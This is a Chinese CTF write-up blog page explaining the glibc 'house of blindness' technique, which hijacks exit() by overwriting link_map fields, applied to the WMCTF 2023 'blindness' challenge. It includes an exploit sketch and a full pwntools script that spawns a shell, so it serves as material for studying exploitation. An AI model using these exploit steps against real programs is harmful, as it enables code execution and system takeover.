@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            【trick】house of blindness
+        </div>
+        <div class="post-meta">
+            2023-11-16
+        </div>
+        <div class="post-md">
+            <blockquote>
+<p>在WMCTF 2023官方wp中，看到了一个十分新奇的手法house of blindness. 其无需leak地址却仍然能够hijack程序流，这里做以学习研究。本文例题使用WMCTF2023 blindness</p>
+<p>参考文章: <a target="_blank" rel="noopener" href="https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA">issues in exit town - HackMD</a></p>
+</blockquote>
+<h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>首先补充一个关于malloc的前置知识</p>
+<ul>
+<li>如果申请的chunk大小非常大，那么便不会使用ptmalloc来进行chunk的分配，而是调用<code>mmap()</code></li>
+<li>另外，这样申请出来的chunk位置与libc和ld的偏移保持一致</li>
+</ul>
+<p>如图，我们申请出来的chunk位置如下</p>
+<p><img src="/img/article/blindness/image-20230907163127358.png" alt="image-20230907163127358"></p>
+<p>可以看到，其地址与libc和ld连在一起</p>
+<h2 id="exit"><a href="#exit" class="headerlink" title="exit"></a>exit</h2><p>首先我们需要关注一下.dynamic节</p>
+<p>在gdb中我们可以使用<code>dyn</code>命令查看.dynamic节内容。其中的内容氛围两个部分，一个是tag用于表示名称，一个是value.</p>
+<p><img src="/img/article/blindness/image-20230907142037610.png" alt="image-20230907142037610"></p>
+<p>这个结构由于是静态的，所以同样可以在IDA中看到</p>
+<p><img src="/img/article/blindness/image-20230907142646702.png" alt="image-20230907142646702"></p>
+<p>其中我们需要关注下<code>DT_FINI</code>这个tag，也就是gdb中显示的<code>FINI</code>，其代表了<code>fini</code>函数到程序加载的虚拟地址的offset，即<code>real_fini_addr = code_base + DT_FINI</code>，以本题为例我们可以得到</p>
+<p><img src="/img/article/blindness/image-20230907143044385.png" alt="image-20230907143044385"></p>
+<p>在<code>exit()</code>函数的源码中，我们可以看到如下部分：</p>
+<pre><code class="c">/* Is there a destructor function?  */
+if (l-&gt;l_info[DT_FINI_ARRAY] != NULL
+    || l-&gt;l_info[DT_FINI] != NULL)
+  &#123;
+    /* When debugging print a message first.  */
+    if (__builtin_expect (GLRO(dl_debug_mask)
+                          &amp; DL_DEBUG_IMPCALLS, 0))
+      _dl_debug_printf (&quot;\ncalling fini: %s [%lu]\n\n&quot;,
+                        DSO_FILENAME (l-&gt;l_name),
+                        ns);
+    /* First see whether an array is given.  */
+    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)
+      &#123;
+        ElfW(Addr) *array =
+          (ElfW(Addr) *) (l-&gt;l_addr
+                          + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);
+        unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val
+                          / sizeof (ElfW(Addr)));
+        while (i-- &gt; 0)
+          ((fini_t) array[i]) ();
+      &#125;
+    /* Next try the old-style destructor.  */
+    if (l-&gt;l_info[DT_FINI] != NULL)
+      DL_CALL_DT_FINI
+        (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);
+  &#125;
+</code></pre>
+<p>其中最下方的<code>DL_CALL_DT_FINI(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</code>便是调用<code>_fini</code>函数的部分，宏定义如下</p>
+<pre><code class="c"># define DL_CALL_DT_FINI(map, start) ((fini_t) (start)) ()
+</code></pre>
+<p>而<code>l_addr</code>和<code>l_info[DT_FINI]</code>正对应这我们前面谈到的codebase和.dynamic节上的偏移，l为在ld中存放的link_map结构</p>
+<p>以本题为例，我们用gdb跟踪exit流。可以发现，在调用完<code>__do_global_dtors_aux</code>之后，程序流便会通过r15，来调用<code>fini</code>，如图</p>
+<p><img src="/img/article/blindness/image-20230907154901922.png" alt="image-20230907154901922"></p>
+<p><img src="/img/article/blindness/image-20230907154040648.png" alt="image-20230907154040648"></p>
+<p>其中<code>mov    rax,QWORD PTR [r15+0xa8] </code>，就是对应<code>l_info[DT_FINI]</code>，即指向.dynmic中DT_FINI条目的指针</p>
+<p><img src="/img/article/blindness/image-20230907154606194.png" alt="image-20230907154606194"></p>
+<p>而<code>add    rax,QWORD PTR [r15]</code>，对应<code>l_addr</code>，也就是codebase</p>
+<h2 id="house-of-blindness"><a href="#house-of-blindness" class="headerlink" title="house of blindness"></a>house of blindness</h2><p>明白了调用<code>fini</code>的原理后，how do we exploit this?</p>
+<p>可以想象，如果我们能够更改<strong>link_map</strong>的内容，比如存放codebase和指向DT_FINI条目的指针。那么在调用fini时，我们就可以控制两者之和为<code>system</code>这样的函数，从而拿到shell（这里我们先不考虑rdi参数如何控制）。这也是所谓house of blindness的核心思想，不过我们还是来看看完整的流程。</p>
+<p>首先考虑，若我们想让两者之和为system这样的libc函数，那么一定要是一个libc的地址+一个偏移的形式，因而原有的codebase+offset的形式是不满足要求的。由于我们没有leak的能力，在不考虑爆破的情况下只能覆盖写最低字节，显然无法让一个text段地址调整至libc。</p>
+<p>原作者给出的解法是利用<code>DT_DEBUG</code>条目。DT_DEBUG中存放了指向<code>_r_debug</code>函数的指针，且<code>_r_debug</code>是一个ld部分的地址，则我们只需要需要将l_addr劫持为<code>_r_debug</code>和<code>system</code>函数的差，l_info[DT_FINI]劫持为DT_DEBUG条目，就可以执行system。</p>
+<p><img src="/img/article/blindness/image-20230907160909407.png" alt="image-20230907160909407"></p>
+<p>此时rdi参数恰好也是ld中的一个指针，另外还需要劫持<code>fini_array</code>为空，防止由于指针更改出现crash</p>
+<p>原作者给出了exp的大致形式如下:</p>
+<pre><code class="python"># disable fini array from exec
+write(ld.address + link_map + l_info + 8 * DT_FINI_ARRAY, p64(0))
+
+# overwrite l_info[DT_FINI]&#39;s lsb so that it points to _r_debug
+write(ld.address + link_map + l_info + 8 * DT_FINI, b&quot;\xb8&quot;)
+
+# overwrite l_addr with offset to bring _r_debug to system
+write(
+    ld.address + link_map,
+    p64(libc.symbols[&quot;system&quot;] - ld.symbols[&quot;_r_debug&quot;], signed=True),
+)
+
+# fill _dl_load_lock with /bin/sh
+write(ld.symbols[&quot;_rtld_global&quot;] + _dl_load_lock, b&quot;/bin/sh\x00&quot;)
+</code></pre>
+<p>总结一下利用条件：</p>
+<ul>
+<li>malloc的size不限制大小，比如可以<code>malloc(0x100000)</code></li>
+<li>可以在malloc出的chunk附近实现越界的任意写</li>
+</ul>
+<p>作者给出的利用条件的形式如下</p>
+<pre><code class="c">// get size from user
+char *chunk = malloc(size);
+// get idx and byte from the user
+chunk[idx] = byte;
+</code></pre>
+<h2 id="WMCTF-blindness"><a href="#WMCTF-blindness" class="headerlink" title="WMCTF blindness"></a>WMCTF blindness</h2><p>WMCTF的这道例题也使用了类似的思想，不过手法并不完全相同，并非利用<code>DT_DEBUG</code>. 我们可以再看一眼本题的.dynamic标签的地址分布</p>
+<p><img src="/img/article/blindness/image-20230907142646702.png" alt="image-20230907142646702"></p>
+<p>可以注意到<code>DT_FINI</code>的地址为0x3DB8，<code>DT_DEBUG</code>的地址为0x3E58，即如果我们考虑原作者的思路。则需要覆盖2个byte，即仍需1&#x2F;16的爆破。但是我们注意到，本题是存在后门<code>backdoor</code>的，那么我们可以控制<code>l_info[DT_FINI]</code>为一个text段的函数，然后利用l_addr偏移至后门即可。可以看到.dynamic上面的一个标签<code>__frame_dummy_init_array_entry</code></p>
+<p><img src="/img/article/blindness/image-20230907173436438.png" alt="image-20230907173436438"></p>
+<p>且恰好后门函数和该函数只有0x9的偏移，如图。那么我们就可以覆盖l_info[DT_FINI]的最低字节从0xB8到0x80，然后控制l_addr偏移为9，从而执行后门函数.</p>
+<p><img src="/img/article/blindness/image-20230907173108919.png" alt="image-20230907173108919"></p>
+<p>官方exp如下，估计出题人套了自己的板子，因而注释与代码并不匹配，这里并非利用DT_DEBUG。且劫持参数为<code>/bin/sh</code>也是无必要的</p>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+import sys
+import os
+from pwn import *
+from ctypes import *
+#context.log_level = &#39;debug&#39;
+def write(addr,content):
+    content = list(content)
+    payload = &quot;@&quot; + p32(addr)
+    for i in range(len(content)):
+        payload += &#39;.&#39; + p8(ord(content[i]))
+        payload += &#39;&gt;&#39;
+    return payload
+def exp():
+    p.recv()
+    p.send(str(0x100000))
+    p.recv()
+    p.send(str(0x100))
+    p.recv()
+    payload = write(0x33f958 - 0x1c000,&quot;/bin/sh;&quot;) #劫持参数
+    payload += write(0x340180-0x33f958-0x8,p64(0x9)) #将l_addr改为DT_DEBUg和system函数的差值
+    payload += write(0x340228-0x340180-0x8,p8(0x88-0x8)) #劫持DT_FINI指向DT_DEBUG
+    payload += write(0x340290-0x340228 - 0x1,p64(0)) #使得DT_FINI_ARRAY为NULL
+    payload += &#39;q&#39;
+    p.send(payload)
+    p.interactive()
+if __name__ == &quot;__main__&quot;:
+    binary = &#39;./main&#39;
+    elf = ELF(&#39;./main&#39;)
+    context.binary = binary
+    if(len(sys.argv) == 3):
+        p = remote(sys.argv[1],sys.argv[2])
+    else:
+        p = process(binary)
+    exp()
+</code></pre>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    <!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="Loora1N";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/about/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body>
+</html>
